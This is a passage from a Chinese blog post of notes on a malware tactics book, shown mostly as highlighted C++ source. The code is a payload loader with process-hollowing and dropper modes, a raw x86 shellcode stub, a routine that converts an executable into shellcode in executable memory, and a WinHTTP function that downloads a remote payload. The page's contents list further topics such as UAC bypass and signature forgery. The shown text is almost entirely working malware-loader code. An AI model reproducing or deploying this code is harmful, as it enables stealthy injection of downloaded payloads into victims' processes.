&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mode_Hollowing) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[!] enter hollowing mode...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[$] process hollowing: %s\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">hollowing</span>(argv[<span class="number">3</span>], (PBYTE)ptrToShc, lenShc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mode_Dropper) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;[!] enter dropper mode...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">hollowing</span>(argv[<span class="number">3</span>], (PBYTE)ptrToShc, lenShc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">wprintf</span>(<span class="string">L&quot;[!] unknown action?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;\ndone.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcodify.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> stub32[] = <span class="string">&quot;\x60\x6a\x30\x58\x64\x8b\x00\x8b\x40\x0c\x8b\x70\x0c\xad\x96\xad\x8b\x68\x18\xe8\x11\x00\x00\x00\x7a\x8e\x25\xe9\xff\x1f\x7c\xc9\x8d\xbd\xc1\x3f\x4a\x0d\xce\x09\x00\x5e\x89\xeb\x8b\x45\x3c\x03\x5c\x05\x78\x99\x89\xe8\x89\xef\x42\x03\x43\x20\x03\x3c\x90\x83\xc8\xff\x32\x07\x6a\x08\x59\xd1\xe8\x73\x05\x35\x20\x83\xb8\xed\xe2\xf5\x47\x38\x0f\x75\xeb\xf7\xd0\x39\x06\x75\xd7\x89\xef\x89\xe8\x03\x7b\x24\x0f\xb7\x3c\x57\x03\x43\x1c\x8b\x04\xb8\x01\xe8\x50\xad\x2a\x0e\x75\xbe\x8b\x74\x24\x34\x8b\x6e\x3c\x01\xf5\xb5\x30\x6a\x40\x51\xff\x75\x50\x6a\x00\xff\x54\x24\x10\x50\x89\xe3\x8b\x4d\x54\x89\xc7\x56\xf3\xa4\x5e\x66\x8b\x4d\x14\x8d\x54\x0d\x18\x66\x8b\x4d\x06\x97\x60\x03\x72\x14\x03\x7a\x0c\x8b\x4a\x10\xf3\xa4\x61\x83\xc2\x28\xe2\xee\x60\xb1\x80\x8b\x2c\x29\x85\xed\x74\x3b\x01\xfd\x8b\x4d\x0c\xe3\x34\x03\x0b\x51\xff\x53\x08\x91\x8b\x7d\x10\x8b\x75\x00\x85\xf6\x0f\x44\xf7\x03\x33\x03\x3b\xad\x85\xc0\x74\x14\x0f\xba\xf0\x1f\x72\x04\x03\x03\x40\x40\x51\x50\x51\xff\x53\x0c\x59\xab\xeb\xe7\x83\xc5\x14\xeb\xc7\x61\xb1\xa0\x8d\x54\x0d\x00\x03\x3a\x31\xc9\x60\x8b\x4f\x04\x83\xe9\x08\x99\x0f\xb7\x44\x17\x08\x50\x80\xe4\xf0\x80\xfc\x30\x58\x75\x12\x80\xe4\x0f\x03\x07\x03\x03\x8b\x30\x2b\x75\x34\x03\x33\x89\x30\x31\xc0\x85\xc0\x75\x22\x42\x42\x39\xd1\x7f\xd5\x61\x03\x4f\x04\x03\x7f\x04\x39\x4a\x04\x7f\xc1\x31\xc9\x51\x51\x49\x51\xff\x53\x10\x8b\x45\x28\x03\x03\xff\xd0\x8d\x63\x14\x61\xc2\x04\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">overwrite_hdr</span><span class="params">(BYTE* my_exe, <span class="type">size_t</span> exe_size, DWORD raw)</span> </span>&#123;</span><br><span class="line">    BYTE redir_code[] = <span class="string">&quot;\x90&quot;</span> <span class="comment">//&quot;\x4D&quot; //dec ebp</span></span><br><span class="line">        <span class="string">&quot;\x90&quot;</span> <span class="comment">//&quot;\x5A&quot; //pop edx</span></span><br><span class="line">        <span class="string">&quot;\x90&quot;</span> <span class="comment">//&quot;\x45&quot; //inc ebp</span></span><br><span class="line">        <span class="string">&quot;\x90&quot;</span> <span class="comment">//&quot;\x52&quot; //push edx</span></span><br><span class="line">        <span class="string">&quot;\xE8\x00\x00\x00\x00&quot;</span> <span class="comment">//call &lt;next_line&gt;</span></span><br><span class="line">        <span class="string">&quot;\x5B&quot;</span> <span class="comment">// pop ebx</span></span><br><span class="line">        <span class="string">&quot;\x48\x83\xEB\x09&quot;</span> <span class="comment">// sub ebx,9</span></span><br><span class="line">        <span class="string">&quot;\x53&quot;</span> <span class="comment">// push ebx (Image Base)</span></span><br><span class="line">        <span class="string">&quot;\x48\x81\xC3&quot;</span> <span class="comment">// add ebx,</span></span><br><span class="line">        <span class="string">&quot;\x59\x04\x00\x00&quot;</span> <span class="comment">// value</span></span><br><span class="line">        <span class="string">&quot;\xFF\xD3&quot;</span> <span class="comment">// call ebx</span></span><br><span class="line">        <span class="string">&quot;\xc3&quot;</span>; <span class="comment">// ret</span></span><br><span class="line">    <span class="type">size_t</span> offset = <span class="built_in">sizeof</span>(redir_code) - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(redir_code + offset, &amp;raw, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">    <span class="built_in">memcpy</span>(my_exe, redir_code, <span class="built_in">sizeof</span>(redir_code));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">shellcodify</span><span class="params">(<span class="type">char</span>* my_exe, DWORD exe_size, DWORD&amp; out_size)</span> </span>&#123;</span><br><span class="line">    out_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> stub_size = <span class="built_in">sizeof</span>(stub32);</span><br><span class="line">    <span class="type">size_t</span> ext_size = exe_size + stub_size;</span><br><span class="line">    <span class="type">char</span>* ext_buf = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, ext_size, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!ext_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(ext_buf, my_exe, exe_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(ext_buf + exe_size, stub32, stub_size);</span><br><span class="line">    DWORD raw_addr = exe_size;</span><br><span class="line">    <span class="built_in">overwrite_hdr</span>((PBYTE)ext_buf, ext_size, raw_addr);</span><br><span class="line">    out_size = ext_size;</span><br><span class="line">    <span class="keyword">return</span> ext_buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//peb.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> LONG PROCESSINFOCLASS;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pfnNtQueryInformationProcess)</span><span class="params">(IN HANDLE ProcessHandle,IN PROCESSINFOCLASS ProcessInformationClass,OUT PVOID ProcessInformation,IN ULONG ProcessInformationLength,OUT PULONG ReturnLength OPTIONAL)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span>* PPEB;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION</span> &#123;</span><br><span class="line">    PVOID Reserved1;</span><br><span class="line">    PPEB PebBaseAddress;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    ULONG_PTR UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION;</span><br><span class="line"><span class="function">PVOID <span class="title">QueryProcessInformation</span><span class="params">(IN HANDLE Process,IN PROCESSINFOCLASS ProcessInformationClass,IN DWORD ProcessInformationLength)</span> </span>&#123;</span><br><span class="line">    PROCESS_BASIC_INFORMATION* pProcessInformation = <span class="literal">NULL</span>;</span><br><span class="line">    pfnNtQueryInformationProcess gNtQueryInformationProcess;</span><br><span class="line">    ULONG ReturnLength = <span class="number">0</span>;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    HMODULE hNtDll;</span><br><span class="line">    <span class="keyword">if</span> (!(hNtDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>))) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Cannot load ntdll.dll.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(gNtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(hNtDll, <span class="string">&quot;NtQueryInformationProcess&quot;</span>))) &#123;</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Cannot load NtQueryInformationProcess.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((pProcessInformation = (PROCESS_BASIC_INFORMATION*)<span class="built_in">malloc</span>(ProcessInformationLength)) == <span class="literal">NULL</span>) &#123; <span class="comment">// Allocate the memory for the requested structure</span></span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;ExAllocatePoolWithTag failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((Status = <span class="built_in">gNtQueryInformationProcess</span>(Process, ProcessInformationClass, pProcessInformation, ProcessInformationLength, &amp;ReturnLength))) &#123; <span class="comment">// Fill the requested structure</span></span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;NtQueryInformationProcess should return NT_SUCCESS (Status = %#x).\n&quot;</span>, Status);</span><br><span class="line">        <span class="built_in">free</span>(pProcessInformation);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ReturnLength != ProcessInformationLength) &#123; <span class="comment">// Check the requested structure size with the one returned by NtQueryInformationProcess</span></span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Warning : NtQueryInformationProcess ReturnLength is different than ProcessInformationLength\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pProcessInformation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//http_download.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function">vector&lt;<span class="type">char</span>&gt;* <span class="title">httpRecv</span><span class="params">(PWSTR url)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt;* binaryData = <span class="keyword">new</span> <span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;();</span><br><span class="line">    WCHAR sz_hostName[MAX_PATH], sz_reqPath[MAX_PATH]; <span class="type">int</span> port = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">swscanf</span>(<span class="built_in">wcsstr</span>(url, <span class="string">L&quot;//&quot;</span>) + <span class="number">2</span>, <span class="string">L&quot;%[^:]:%d%s&quot;</span>, sz_hostName, &amp;port, sz_reqPath) == <span class="number">3</span>); <span class="comment">// parse url.</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">swscanf</span>(<span class="built_in">wcsstr</span>(url, <span class="string">L&quot;//&quot;</span>) + <span class="number">2</span>, <span class="string">L&quot;%[^/]%s&quot;</span>, sz_hostName, sz_reqPath) == <span class="number">2</span>)</span><br><span class="line">        port = <span class="built_in">wcsstr</span>(url, <span class="string">L&quot;https&quot;</span>) ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> binaryData;</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[v] send request -&gt; %s:%i [Path = %s]\n&quot;</span>, sz_hostName, port, sz_reqPath);</span><br><span class="line">    HINTERNET  hSession = <span class="literal">NULL</span>, hConnect = <span class="literal">NULL</span>, hRequest = <span class="literal">NULL</span>; <span class="comment">// launch a http request.</span></span><br><span class="line">    hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;WinHTTP Example/1.0&quot;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    hConnect = <span class="built_in">WinHttpConnect</span>(hSession, sz_hostName, port, <span class="number">0</span>);</span><br><span class="line">    hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, sz_reqPath, <span class="literal">NULL</span>, WINHTTP_NO_REFERER, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hRequest) <span class="keyword">return</span> binaryData;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WinHttpSendRequest</span>(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="keyword">or</span> !<span class="built_in">WinHttpReceiveResponse</span>(hRequest, <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">return</span> binaryData;</span><br><span class="line">    <span class="type">char</span> byteCache[<span class="number">4096</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// recv binary data.</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD <span class="built_in">dwRead</span>(<span class="built_in">sizeof</span>(byteCache)); dwRead == <span class="built_in">sizeof</span>(byteCache); ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">WinHttpReadData</span>(hRequest, byteCache, <span class="built_in">sizeof</span>(byteCache), &amp;dwRead)) <span class="keyword">return</span> binaryData;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> x = <span class="number">0</span>; x &lt; dwRead; x++) binaryData-&gt;<span class="built_in">push_back</span>(byteCache[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hRequest) <span class="built_in">WinHttpCloseHandle</span>(hRequest); <span class="comment">// clean up.</span></span><br><span class="line">    <span class="keyword">if</span> (hConnect) <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[v] recv payload [size = %i] done.\n&quot;</span>, binaryData-&gt;<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span> binaryData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://monoceros406.github.io">Monoceros406</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/">https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://monoceros406.github.io" target="_blank">The Blog of Monoceros406</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">恶意代码</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E5%AE%9E%E6%88%98%E5%9F%BA%E7%A1%80/" title="硬件安全初探-实战基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">硬件安全初探-实战基础</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/16/Windows%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2-WinDBG%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/" title="Windows软件调试初探-WinDBG命令入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Windows软件调试初探-WinDBG命令入门</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/09/C-%E7%97%85%E6%AF%92%E6%8A%80%E6%9C%AF/" title="C++病毒技术"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-09</div><div class="title">C++病毒技术</div></div></a></div><div><a href="/2024/08/21/C-%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/" title="C++源码免杀入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="title">C++源码免杀入门</div></div></a></div><div><a href="/2024/08/21/CobaltStrike4-8%E5%88%9D%E6%8E%A2/" title="CobaltStrike4.8初探"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="title">CobaltStrike4.8初探</div></div></a></div><div><a href="/2024/01/13/Veil%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/" title="Veil免杀入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-13</div><div class="title">Veil免杀入门</div></div></a></div><div><a href="/2023/11/15/Yara%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/" title="Yara使用入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Yara使用入门</div></div></a></div><div><a href="/2024/09/17/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-Rootkit%E5%88%9D%E6%8E%A2/" title="恶意代码分析-Rootkit初探"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-17</div><div class="title">恶意代码分析-Rootkit初探</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Monoceros406</div><div class="author-info__description">智邮普创工作室安全组（退役）/Nepnep联合战队</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">318</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Monoceros406"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Monoceros406" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:monoceros406@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://monoceros406.github.io/atom.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">哪里排版出锅了请告诉我QwQ  QQ:1295625063</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">恶意程式前线战术指南笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%A3%E6%A1%88%E6%98%A0%E5%B0%84"><span class="toc-number">1.1.</span> <span class="toc-text">档案映射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E8%A0%95%E8%99%AB%E6%84%9F%E6%9F%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">PE蠕虫感染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E7%BB%93%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">连结器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Hollowing"><span class="toc-number">1.1.3.</span> <span class="toc-text">Process Hollowing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E4%BD%8D%E7%AD%BE%E5%90%8D"><span class="toc-number">1.2.</span> <span class="toc-text">数位签名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">签名伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E5%87%91%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">杂凑校验绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">签名扩展攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E6%AD%A3%E8%A7%84%E5%8C%96%E6%BB%A5%E7%94%A8%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text">路径正规化滥用攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC%E9%98%B2%E6%8A%A4%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">UAC防护逆向工程至本地提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E9%97%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC%E4%BB%8B%E9%9D%A2%E7%A8%8B%E5%BC%8F-ConsentUI"><span class="toc-number">1.3.2.</span> <span class="toc-text">UAC介面程式 ConsentUI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%BD%93%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E5%BC%95%E5%8F%91%E7%9A%84%E7%89%B9%E6%9D%83%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">不当注册表配置引发的特权劫持提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Elevated-COM-Object-UAC-Bypass"><span class="toc-number">1.3.4.</span> <span class="toc-text">Elevated COM Object UAC Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMSTP%E4%BB%BB%E6%84%8F%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.5.</span> <span class="toc-text">CMSTP任意特权提升执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%8F%E8%BF%87%E4%BF%A1%E4%BB%BB%E8%B7%AF%E5%BE%84%E7%A2%B0%E6%92%9E%E8%BE%BE%E6%88%90%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.6.</span> <span class="toc-text">透过信任路径碰撞达成提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%BB%BA%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8%EF%BC%9A%E6%8E%A2%E7%B4%A2WOW64%E6%A8%A1%E6%8B%9F%E6%9C%BA%E8%87%B3%E5%A4%BA%E5%9B%9E64%E4%BD%8D%E5%85%83%E5%A4%A9%E5%A0%82%E8%83%9C%E5%9C%B0"><span class="toc-number">1.4.</span> <span class="toc-text">重建天堂之门：探索WOW64模拟机至夺回64位元天堂胜地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E9%97%A8-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WOW64%E6%A8%A1%E6%8B%9F%E6%9C%BA%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.4.2.</span> <span class="toc-text">WOW64模拟机初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TurboThunkDispatch"><span class="toc-number">1.4.3.</span> <span class="toc-text">TurboThunkDispatch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtAPI%E8%BF%87%E6%B8%A1%E5%B1%82Trampoline"><span class="toc-number">1.4.4.</span> <span class="toc-text">NtAPI过渡层Trampoline</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%A0%82%E7%BF%BB%E8%AF%91%E6%9C%BA%E6%A0%B8%E5%BF%83"><span class="toc-number">1.4.5.</span> <span class="toc-text">天堂翻译机核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x96-Shellcode"><span class="toc-number">1.4.6.</span> <span class="toc-text">x96 Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8%E6%9A%B4%E6%90%9C%E8%AE%B0%E5%BF%86%E4%BD%93"><span class="toc-number">1.4.7.</span> <span class="toc-text">滥用天堂之门暴搜记忆体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%A0%82%E5%9C%A3%E6%9D%AF"><span class="toc-number">1.4.8.</span> <span class="toc-text">天堂圣杯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%A0%82%E6%B3%A8%E5%85%A5%E5%99%A8"><span class="toc-number">1.4.9.</span> <span class="toc-text">天堂注入器</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/11/Qt6%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8-Qt%E6%A1%86%E6%9E%B6%E7%BB%BC%E8%BF%B0/" title="Qt6开发入门-Qt框架综述">Qt6开发入门-Qt框架综述</a><time 